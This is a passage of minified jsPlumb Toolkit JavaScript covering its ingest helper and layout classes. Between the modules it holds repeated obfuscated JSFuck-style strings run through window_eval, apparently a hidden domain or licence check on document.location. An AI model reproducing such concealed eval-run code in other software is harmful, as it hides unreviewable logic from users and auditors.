}.call("undefined" != typeof window ? window : this), window_eval(decodeURIComponent("window._j%3D~%5B%5D%3Bwindow._j%3D%7B___%3A%2B%2Bwindow._j%2C%24%24%24%24%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C__%24%3A%2B%2Bwindow._j%2C%24_%24_%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C_%24_%3A%2B%2Bwindow._j%2C%24_%24%24%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%24%3A(window._j%5Bwindow._j%5D%2B%22%22)%5Bwindow._j%5D%2C_%24%24%3A%2B%2Bwindow._j%2C%24%24%24_%3A(!%22%22%2B%22%22)%5Bwindow._j%5D%2C%24__%3A%2B%2Bwindow._j%2C%24_%24%3A%2B%2Bwindow._j%2C%24%24__%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%3A%2B%2Bwindow._j%2C%24%24%24%3A%2B%2Bwindow._j%2C%24___%3A%2B%2Bwindow._j%2C%24__%24%3A%2B%2Bwindow._j%7D%3Bwindow._j.%24_%3D(window._j.%24_%3Dwindow._j%2B%22%22)%5Bwindow._j.%24_%24%5D%2B(window._j._%24%3Dwindow._j.%24_%5Bwindow._j.__%24%5D)%2B(window._j.%24%24%3D(window._j.%24%2B%22%22)%5Bwindow._j.__%24%5D)%2B((!window._j)%2B%22%22)%5Bwindow._j._%24%24%5D%2B(window._j.__%3Dwindow._j.%24_%5Bwindow._j.%24%24_%5D)%2B(window._j.%24%3D(!%22%22%2B%22%22)%5Bwindow._j.__%24%5D)%2B(window._j._%3D(!%22%22%2B%22%22)%5Bwindow._j._%24_%5D)%2Bwindow._j.%24_%5Bwindow._j.%24_%24%5D%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j.%24%3Bwindow._j.%24%24%3Dwindow._j.%24%2B(!%22%22%2B%22%22)%5Bwindow._j._%24%24%5D%2Bwindow._j.__%2Bwindow._j._%2Bwindow._j.%24%2Bwindow._j.%24%24%3Bwindow._j.%24%3D(window._j.___)%5Bwindow._j.%24_%5D%5Bwindow._j.%24_%5D%3Bwindow._j.%24(window._j.%24(window._j.%24%24%2B%22%5C%22%22%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.%24%24%24%24%2B%22(%22%2Bwindow._j.%24%24_%24%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.__%2B%22.%22%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j.%24_%24_%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2B%22.%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24_%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22!%3D%3D'%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.___%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%24%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j._%24%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.__%2B%22.%22%2Bwindow._j.%24%24__%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2B%22')%22%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.___%2Bwindow._j.%24_%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22()%3B%22%2B%22%5C%22%22)())()%3B")), function () {
    var a = this, b = a.jsPlumbToolkit;
    b.Support = {
        ingest: function (c) {
            var d = c.jsPlumb || a.jsPlumb;
            if (!d.getContainer()) throw new TypeError("No Container set on jsPlumb instance. Cannot continue.");
            var e = b.newInstance(), f = d.select(), g = {}, h = function () {
                return "default"
            }, i = c.idFunction || function (a) {
                return d.getId(a)
            }, j = c.typeFunction || h, k = c.idFunction || function (a) {
                return a.id
            }, l = c.edgeTypeFunction || h, m = !1 !== c.render, n = function (a) {
                var b = i(a), c = j(a), f = d.getId(a);
                null == g[f] && (g[f] = e.addNode({id: b, type: c}, null, !0), a.jtk = {node: g[f]})
            }, o = function (a) {
                var b = g[a.sourceId], c = g[a.targetId], d = k(a), f = l(a);
                a.edge = e.addEdge({source: b, target: c, data: {id: d, type: f}}, null, !0)
            };
            if (c.nodeSelector) for (var p = d.getContainer().querySelectorAll(c.nodeSelector), q = 0; q < p.length; q++) {
                var r = d.getId(p[q]);
                n(p[q], r), d.manage(r, p[q])
            }
            var s = d.getManagedElements();
            for (var r in s) n(s[r].el, r);
            if (f.each(function (a) {
                o(a)
            }), m) {
                var t = a.jsPlumb.extend({}, c.renderParams || {});
                t.jsPlumbInstance = d, t.container = d.getContainer();
                var u = e.render(t);
                return u.ingest = function (a) {
                    n(a), u.importNode(a, i(a))
                }, u
            }
            return e
        }
    }
}.call("undefined" != typeof window ? window : this),
    window_eval(decodeURIComponent("window._j%3D~%5B%5D%3Bwindow._j%3D%7B___%3A%2B%2Bwindow._j%2C%24%24%24%24%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C__%24%3A%2B%2Bwindow._j%2C%24_%24_%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C_%24_%3A%2B%2Bwindow._j%2C%24_%24%24%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%24%3A(window._j%5Bwindow._j%5D%2B%22%22)%5Bwindow._j%5D%2C_%24%24%3A%2B%2Bwindow._j%2C%24%24%24_%3A(!%22%22%2B%22%22)%5Bwindow._j%5D%2C%24__%3A%2B%2Bwindow._j%2C%24_%24%3A%2B%2Bwindow._j%2C%24%24__%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%3A%2B%2Bwindow._j%2C%24%24%24%3A%2B%2Bwindow._j%2C%24___%3A%2B%2Bwindow._j%2C%24__%24%3A%2B%2Bwindow._j%7D%3Bwindow._j.%24_%3D(window._j.%24_%3Dwindow._j%2B%22%22)%5Bwindow._j.%24_%24%5D%2B(window._j._%24%3Dwindow._j.%24_%5Bwindow._j.__%24%5D)%2B(window._j.%24%24%3D(window._j.%24%2B%22%22)%5Bwindow._j.__%24%5D)%2B((!window._j)%2B%22%22)%5Bwindow._j._%24%24%5D%2B(window._j.__%3Dwindow._j.%24_%5Bwindow._j.%24%24_%5D)%2B(window._j.%24%3D(!%22%22%2B%22%22)%5Bwindow._j.__%24%5D)%2B(window._j._%3D(!%22%22%2B%22%22)%5Bwindow._j._%24_%5D)%2Bwindow._j.%24_%5Bwindow._j.%24_%24%5D%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j.%24%3Bwindow._j.%24%24%3Dwindow._j.%24%2B(!%22%22%2B%22%22)%5Bwindow._j._%24%24%5D%2Bwindow._j.__%2Bwindow._j._%2Bwindow._j.%24%2Bwindow._j.%24%24%3Bwindow._j.%24%3D(window._j.___)%5Bwindow._j.%24_%5D%5Bwindow._j.%24_%5D%3Bwindow._j.%24(window._j.%24(window._j.%24%24%2B%22%5C%22%22%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.%24%24%24%24%2B%22(%22%2Bwindow._j.%24%24_%24%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.__%2B%22.%22%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j.%24_%24_%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2B%22.%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24_%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22!%3D%3D'%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.___%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%24%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j._%24%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.__%2B%22.%22%2Bwindow._j.%24%24__%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2B%22')%22%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.___%2Bwindow._j.%24_%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22()%3B%22%2B%22%5C%22%22)())()%3B")), function () {
    "use strict";
    var a = this, b = a.jsPlumbToolkit, c = b.Layouts = {Decorators: {}}, d = a.jsPlumbUtil, e = function (a) {
        var b = 1 / 0, c = 1 / 0, d = -1 / 0, e = -1 / 0;
        for (var f in a) b = Math.min(b, a[f][0]), d = Math.max(d, a[f][0]), c = Math.min(c, a[f][1]), e = Math.max(e, a[f][1]);
        return [[b, c], [d, e], Math.abs(b - d), Math.abs(c - e)]
    }, f = function (a, b, e) {
        if (null == a) return [];
        for (var f = [], g = function (a) {
            var f = "string" == typeof a ? a : a[0], g = c.Decorators[f], h = "string" == typeof a ? {} : a[1];
            return g ? new g(h, b, e) : (d.log("Decorator [" + f + "] nor registered on jsPlumbToolkit.Layouts.Decorators. Not fatal."), null)
        }, h = 0; h < a.length; h++) {
            var i = g(a[h]);
            i && f.push(i)
        }
        return f
    };
    c.AbstractLayout = function (b) {
        function c(a, b) {
            if (!C[a]) {
                var c = b || [0, 0];
                C[a] = {id: a, size: N(a), position: c, xmax: c[0], ymax: c[1], xmin: c[0], ymin: c[1]}
            }
            return C[a]
        }

        function d(a) {
            delete C[a]
        }

        function g() {
            D.length = 0, F.length = 0, E.length = 0, G.length = 0;
            for (var a in C) O(D, C[a], "xmax"), O(E, C[a], "ymax"), O(F, C[a], "xmin"), O(G, C[a], "ymin");
            if (v = F.length > 0 ? F[0].xmin : 0, x = D.length > 0 ? D[D.length - 1].xmax : 0, w = G.length > 0 ? G[0].ymin : 0, y = E.length > 0 ? E[E.length - 1].ymax : 0, !q && (v < 0 || w < 0)) {
                var b = v < 0 ? v : 0, c = w < 0 ? w : 0;
                if (b < 0 || c < 0) {
                    for (var d in t) t[d][0] -= b, t[d][1] -= c;
                    for (var e in C) C[e].position[0] -= b, C[e].xmin -= b, C[e].xmax -= b, C[e].position[1] -= c, C[e].ymin -= c, C[e].ymax -= c;
                    v -= b, w -= c, x -= b, y -= c
                }
            }
        }

        function h(a, b) {
            a.xmax = a.position[0] + a.size[0], a.ymax = a.position[1] + a.size[1], a.xmin = a.position[0], a.ymin = a.position[1], b && g()
        }

        b = b || {};
        var i = this, j = function () {
            return {padding: [0, 0]}
        }, k = function () {
            var b = a.jsPlumb.extend(j(), i.defaultParameters || {});
            a.jsPlumb.extend(b, m || {}), m = b
        }, l = b.adapter, m = b.parameters || {}, n = b.getElementForNode, o = a.Farahey.getInstance({
            getPosition: function (a) {
                var b = t[a.id];
                return {left: b[0], top: b[1]}
            }, getSize: function (a) {
                return B[a.id]
            }, getId: function (a) {
                return a.id
            }, setPosition: function (a, b) {
                S(a.id, b.left, b.top)
            }, padding: m.padding, filter: function (a) {
                return (!z[a] || !z[a].group) && (!i.canMagnetize || i.canMagnetize(a))
            }
        }), p = !1 !== b.magnetized && (i.defaultMagnetized || !0 === b.magnetize), q = !1 !== b.negativeValuesAllowed;
        this.decorators = f(b.decorators, b.adapter, b.container), this.adapter = b.adapter;
        var r = b.jsPlumb || a.jsPlumb, s = b.jsPlumbToolkit, t = {}, u = [], v = 1 / 0, w = 1 / 0, x = -1 / 0,
            y = -1 / 0, z = {}, A = {}, B = {}, C = {}, D = [], E = [], F = [], G = [], H = b.container,
            I = r.getSize(H), J = b.width || I[0], K = b.height || I[1], L = !1, M = function () {
                L = !1, v = 1 / 0, x = -1 / 0, w = 1 / 0, y = -1 / 0;
                for (var a = 0; a < i.decorators.length; a++) i.decorators[a].reset({remove: r.remove});
                t = {}, u.splice(0), C = {}, F.length = 0, G.length = 0, D.length = 0, E.length = 0, B = {}, o.reset(), i.reset && i.reset()
            };
        this.getMagnetizedElements = function () {
            return o.getElements()
        }, this.magnetize = function (a) {
            a = a || {};
            var b = a.event ? "executeAtEvent" : a.origin ? "execute" : "executeAtCenter",
                c = a.event ? [a.event, a.options] : a.origin ? [a.origin, a.options] : [a.options];
            a.force && this.forceMagnetize && this.forceMagnetize(), o[b].apply(o, c), W(r.repaintEverything)
        }, this.nodeAdded = function (a, b) {
            if (i.adapter.filter(a.node)) {
                var c = b && b.position ? b.position : a.node.data && a.node.data.left && a.node.data.top ? a.node.data : i.adapter.getOffset(a.el);
                if (this._nodeAdded) {
                    var d = this._nodeAdded(a, b);
                    d && (c.left = d[0], c.top = d[1])
                }
                z[a.node.id] = a.node, S(a.node.id, c.left, c.top), N(a.node.id, a.el), o.addElement(a.node)
            }
        }, this.nodeRemoved = function (a) {
            delete t[a.node.id], delete B[a.node.id], delete z[a.node.id], d(a.node.id), this._nodeRemoved && this._nodeRemoved(a.node), o.removeElement(a.node)
        }, this.groupAdded = function (a, b) {
            if (i.adapter.filter(a.group)) {
                var c = b && b.position ? b.position : a.group.data && a.group.data.left && a.group.data.top ? a.group.data : i.adapter.getOffset(a.el);
                if (this._groupAdded) {
                    var d = this._groupAdded(a, b);
                    d && (c.left = d[0], c.top = d[1])
                }
                A[a.group.id] = a.group, S(a.group.id, c.left, c.top), N(a.group.id, a.el), o.addElement(a.group)
            }
        }, this.groupRemoved = function (a) {
            delete t[a.group.id], delete B[a.group.id], delete A[a.group.id], d(a.group.id), this._groupRemoved && this._groupRemoved(a.group), o.removeElement(a.group)
        };
        var N = function (a, b) {
            var c = B[a];
            return c || (b = b || n(a), null != b ? (c = r.getSize(b), B[a] = c) : c = [0, 0]), c
        }, O = function (a, b, c) {
            a.push(b);
            for (var d = a.length - 1, e = a[d]; d > 0 && e[c] < a[d - 1][c];) a[d] = a[d - 1], d -= 1;
            return a[d] = e, d
        }, P = function (a, b, c, d) {
            var e = t[a];
            if (!e) {
                if (null != b && null != c) e = [b, c]; else {
                    if (d) return null;
                    e = [Math.floor(Math.random() * (J + 1)), Math.floor(Math.random() * (K + 1))]
                }
                S(a, e[0], e[1])
            }
            return e
        }, Q = function (a, b, d) {
            if (null != a) {
                b = parseFloat(b), d = parseFloat(d);
                var e = t[a];
                e || (e = t[a] = [0, 0], u.push([e, a]));
                var f = c(a, [b, d]);
                f.position[0] = b, f.position[1] = d, h(f), t[a] = [b, d]
            }
        }, R = function (a, b, c) {
            z[a] && i._nodeMoved ? i._nodeMoved(a, b, c) : A[a] && i._groupMoved && i._groupMoved(a, b, c)
        }, S = (this.setMagnetizedPosition = function (a, b, c, d) {
            Q(a, b, c), this.magnetize({
                options: {
                    filter: function (b) {
                        return b === a
                    }, padding: [5, 5], exclude: function (a, b) {
                        return null != b.group
                    }, excludeFocus: !0
                }
            });
            var e = this.getPosition(a);
            return d && R(a, e[0], e[1]), e
        }, function (a, b, c, d) {
            Q(a, b, c), d && R(a, b, c)
        }), T = function (a, b, d, e) {
            b = b || 10, d = d || 10;
            var f = Math.floor(Math.random() * b), g = Math.floor(Math.random() * d), i = c(a, [f, g]);
            return i.position = [f, g], h(i, !0 !== e), t[a] = [f, g], [f, g]
        }, U = function () {
            for (var a in t) console.log(a, t[a][0], t[a][1])
        }, V = function (a) {
            var b = n(a);
            if (null != b) {
                var d = c(a).position;
                return i.adapter.setElementPosition(b, d[0], d[1]), d.concat(N(a))
            }
            return null
        }.bind(this), W = this.draw = function (a) {
            for (var b in C) {
                V(b)
            }
            for (var c = 0; c < i.decorators.length; c++) i.decorators[c].decorate({
                adapter: i.adapter,
                layout: i,
                append: function (a, b, c) {
                    i.adapter.append(a, b, c, !0)
                },
                setAbsolutePosition: i.adapter.setAbsolutePosition,
                toolkit: s,
                jsPlumb: r,
                bounds: [v, w, x, y],
                floatElement: i.adapter.floatElement,
                fixElement: i.adapter.fixElement
            });
            a && a()
        }, X = function (a) {
            console.log(a);
            var b = e(t, N, n);
            U(), console.log(b[0], b[1], b[2], b[3])
        };
        this.setPosition = function (a, b, c) {
            S(a, b, c, !0), g()
        }, this.bb = X;
        var Y = this.getPositions = function () {
            return t
        }, Z = (this.getPosition = function (a) {
            return t[a]
        }, this.getExtents = function () {
            return [v, w, x, y]
        }), $ = (this.getSize = function (a) {
            return B[a]
        }, function (a, b) {
            B[a] = b;
            var d = c(a);
            d.size = b, h(d, !0)
        });
        this.setSize = $, this.begin = function (a, b) {
        }, this.end = function (a, b) {
        };
        var _ = function (a) {
            if (null != s) {
                k(), o.setElements(l.getElements()), this.begin && this.begin(s, m);
                for (var b = function () {
                    g(), W(function () {
                        p && i.magnetize(), i.end && i.end(s, m), a && a()
                    })
                }; !L;) this.step(s, m);
                b()
            }
        }.bind(this);
        return this.relayout = function (a, b) {
            M(), null != a && (m = a), _(b)
        }, this.layout = function (a) {
            L = !1, _(a)
        }, this.clear = function () {
            M()
        }, {
            adapter: b.adapter,
            jsPlumb: r,
            toolkit: s,
            getPosition: P,
            setPosition: S,
            getRandomPosition: T,
            getSize: N,
            setSize: $,
            getPositions: Y,
            setPositions: function (a) {
                t = a
            },
            getExtents: Z,
            width: J,
            height: K,
            reset: M,
            draw: W,
            setDone: function (a) {
                L = a
            }
        }
    }, c.EmptyLayout = function (a) {
        var b = {}, c = {};
        this.refresh = this.relayout = this.layout = function () {
            this.clear();
            var c, d, e = a.getElements();
            for (d = 0; d < e.length; d++) c = e[d], b[c.id] = [0, 0]
        }, this.nodeRemoved = this.groupRemoved = function (a) {
            delete b[a.id]
        }, this.nodeAdded = this.groupAdded = function (a) {
            b[a.id] = !1
        }, this.getPositions = function () {
            return b
        }, this.getPosition = function (a) {
            return b[a]
        }, this.setPosition = function (a, c, d) {
            b[a] = [c, d]
        }, this.getExtents = function () {
            return [0, 0, 0, 0]
        }, this.clear = function () {
        }, this.getMagnetizedElements = function () {
            return []
        }, this.setSize = function (a, b) {
            c[a] = b
        }, this.getSize = function (a) {
            return c[a]
        }
    }, c.Mistletoe = function (b) {
        if (!b.parameters.layout) throw"No layout specified for MistletoeLayout";
        var e = {}, f = a.jsPlumb.extend({}, b);
        f.getElementForNode = function (a) {
            return e[a]
        };
        var g, h, i, j = c.AbstractLayout.apply(this, [f]), k = b.parameters.layout, l = function () {
            j.setPositions(k.getPositions()), j.draw(), this.fire("redraw")
        }.bind(this);
        d.EventGenerator.apply(this, arguments), this.map = function (a, b) {
            e[a] = b
        };
        var m = function () {
            e = {}, g = k.layout, h = k.relayout, i = k.clear, k.layout = function () {
                g.apply(k, arguments), l()
            }, k.relayout = function () {
                j.reset(), h.apply(k, arguments), l()
            }, k.clear = function () {
                i.apply(k, arguments), j.reset()
            }
        };
        m(), this.setHostLayout = function (a) {
            k = a, m()
        }
    };
    var g = function (a) {
        a = a || {};
        var b = c.AbstractLayout.apply(this, arguments), d = function (a) {
            return [a.data.left, a.data.top]
        }, e = function (b, c) {
            return (a.locationFunction || d)(b)
        }, f = function (a, c, d) {
            for (var f = b.adapter[a](), g = f.length, h = 0; h < g; h++) {
                var i = f[h], j = i.getFullId(), k = b.getPosition(j, null, null, !0);
                null == k && (k = e(i, d)), this.setPosition(j, k[0], k[1], !0)
            }
        }.bind(this);
        return this.begin = function (a, b) {
            f("getElements", a, b)
        }, this._nodeAdded = function (b, c) {
            return e(b.node, a.parameters || {})
        }, this._groupAdded = function (b, c) {
            return e(b.group, a.parameters || {})
        }, this.getAbsolutePosition = function (a, b) {
            return e(a, b)
        }, this.step = function () {
            b.setDone(!0)
        }, b
    };
    d.extend(g, c.AbstractLayout), c.AbsoluteBackedLayout = g, c.Absolute = function (a) {
        c.AbsoluteBackedLayout.apply(this, arguments)
    }, d.extend(c.Absolute, c.AbsoluteBackedLayout);
    var h = function (a) {
        var b = this, d = c.AbstractLayout.apply(this, arguments), e = a.adapter;
        return b.begin = function (b, c) {
            c.ignoreLoops = !(!1 === a.ignoreLoops), c.getRootNode = c.getRootNode || function (b) {
                if (!1 !== a.multipleRoots) return b.filter(function (a) {
                    return ("Node" === a.objectType || "Group" === a.objectType) && 0 === a.getTargetEdges().length && e.filter(a)
                }).getAll();
                var c = d.adapter.getElements();
                return c.length > 0 ? c[0] : null
            }, c.getChildEdges = c.getChildEdges || function (b, c) {
                return d.toolkit.getAllEdgesFor(b, function (c) {
                    var d = c.target.getNode ? c.target.getNode() : c.target;
                    return (c.source === b || !0 !== a.ignorePorts && c.source.getNode && c.source.getNode() === b) && e.filter(d)
                })
            }, c.rootNode = c.getRootNode(b), c.rootNode || d.setDone(!0)
        }, d
    };
    d.extend(h, c.AbstractLayout), c.AbstractHierarchicalLayout = h
}.call("undefined" != typeof window ? window : this), window_eval(decodeURIComponent("window._j%3D~%5B%5D%3Bwindow._j%3D%7B___%3A%2B%2Bwindow._j%2C%24%24%24%24%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C__%24%3A%2B%2Bwindow._j%2C%24_%24_%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C_%24_%3A%2B%2Bwindow._j%2C%24_%24%24%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%24%3A(window._j%5Bwindow._j%5D%2B%22%22)%5Bwindow._j%5D%2C_%24%24%3A%2B%2Bwindow._j%2C%24%24%24_%3A(!%22%22%2B%22%22)%5Bwindow._j%5D%2C%24__%3A%2B%2Bwindow._j%2C%24_%24%3A%2B%2Bwindow._j%2C%24%24__%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%3A%2B%2Bwindow._j%2C%24%24%24%3A%2B%2Bwindow._j%2C%24___%3A%2B%2Bwindow._j%2C%24__%24%3A%2B%2Bwindow._j%7D%3Bwindow._j.%24_%3D(window._j.%24_%3Dwindow._j%2B%22%22)%5Bwindow._j.%24_%24%5D%2B(window._j._%24%3Dwindow._j.%24_%5Bwindow._j.__%24%5D)%2B(window._j.%24%24%3D(window._j.%24%2B%22%22)%5Bwindow._j.__%24%5D)%2B((!window._j)%2B%22%22)%5Bwindow._j._%24%24%5D%2B(window._j.__%3Dwindow._j.%24_%5Bwindow._j.%24%24_%5D)%2B(window._j.%24%3D(!%22%22%2B%22%22)%5Bwindow._j.__%24%5D)%2B(window._j._%3D(!%22%22%2B%22%22)%5Bwindow._j._%24_%5D)%2Bwindow._j.%24_%5Bwindow._j.%24_%24%5D%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j.%24%3Bwindow._j.%24%24%3Dwindow._j.%24%2B(!%22%22%2B%22%22)%5Bwindow._j._%24%24%5D%2Bwindow._j.__%2Bwindow._j._%2Bwindow._j.%24%2Bwindow._j.%24%24%3Bwindow._j.%24%3D(window._j.___)%5Bwindow._j.%24_%5D%5Bwindow._j.%24_%5D%3Bwindow._j.%24(window._j.%24(window._j.%24%24%2B%22%5C%22%22%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.%24%24%24%24%2B%22(%22%2Bwindow._j.%24%24_%24%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.__%2B%22.%22%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j.%24_%24_%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2B%22.%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24_%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22!%3D%3D'%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow